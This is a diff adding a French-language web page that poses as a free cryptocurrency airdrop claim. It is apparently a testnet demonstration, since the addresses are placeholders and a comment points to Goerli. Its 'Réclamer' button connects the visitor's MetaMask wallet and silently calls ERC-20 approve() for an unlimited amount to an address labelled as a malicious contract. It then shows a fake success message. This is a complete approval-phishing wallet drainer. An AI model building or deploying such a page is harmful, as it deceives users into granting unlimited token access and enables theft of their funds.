@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airdrop Gratuit</title>
+</head>
+<body>
+    <h1>🎁 Réclamez votre Airdrop Gratuit !</h1>
+    <button onclick="approveScamContract()">Réclamer</button>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script>
+        async function approveScamContract() {
+            if (!window.ethereum) {
+                alert("Installez Metamask !");
+                return;
+            }
+
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+
+            const tokenAddress = "0xTOKEN_TESTNET"; // Remplace par l'adresse d'un token ERC-20 sur Goerli
+            const scamContract = "0xCONTRACT_MALICIEUX"; // Adresse de ton contrat malveillant
+
+            const erc20 = new ethers.Contract(tokenAddress, [
+                "function approve(address spender, uint256 amount) public returns (bool)"
+            ], signer);
+
+            await erc20.approve(scamContract, ethers.constants.MaxUint256);
+            alert("Félicitations, vous avez réclamé votre airdrop !");
+        }
+    </script>
+</body>
+</html>
